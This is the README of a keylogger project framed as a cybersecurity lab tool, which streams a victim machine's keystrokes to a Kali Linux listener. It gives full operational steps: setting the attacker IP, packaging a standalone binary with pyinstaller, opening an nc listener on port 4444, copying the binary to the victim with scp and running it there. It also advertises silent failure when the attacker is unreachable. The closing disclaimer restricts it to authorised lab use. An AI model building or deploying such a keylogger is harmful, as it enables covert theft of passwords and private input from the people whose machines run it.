# Network Keystroke Monitor (Lab Edition)

A standalone keystroke logger designed for **cybersecurity lab simulations**.  
It captures keystrokes on a victim machine and streams them to a Kali Linux listener in real time.

---

## ⚙️ Configuration

Edit the attacker IP before building:

```bash
nano src/main.py
````

Change:

```python
KALI_IP = "192.168.X.X"
```

Replace it with your **Kali Linux IP**.

---

## 🛠️ Build Instructions

Run on the developer machine:

```bash
pip install pynput pyinstaller
pyinstaller --onefile --clean --paths=src src/main.py
```

Output binary:

```bash
dist/main
```

---

## 🧪 Lab Simulation – How to Run

### Lab Setup

* Attacker: Kali Linux
* Victim: Ubuntu / Arch Linux
* Network: Same internal / virtual network
* Port: 4444

### Step 1: Attacker (Kali)

```bash
nc -lvp 4444
```

### Step 2: Transfer Binary to Victim

```bash
scp dist/main user@VICTIM_IP:/home/user/
```

### Step 3: Victim (Ubuntu / Arch)

```bash
cd /home/user/
chmod +x main
./main
```

### Step 4: Test

* Type on the victim machine
* Keystrokes appear live on the Kali terminal

---

## 🛡️ Features

* Single standalone ELF binary
* No Python required on victim
* Clean keystroke stream
* Silent failure if attacker unreachable

---

## ⚠️ Disclaimer

This project is for **authorized educational cybersecurity lab use only**.
Do **NOT** use on real systems or real users.
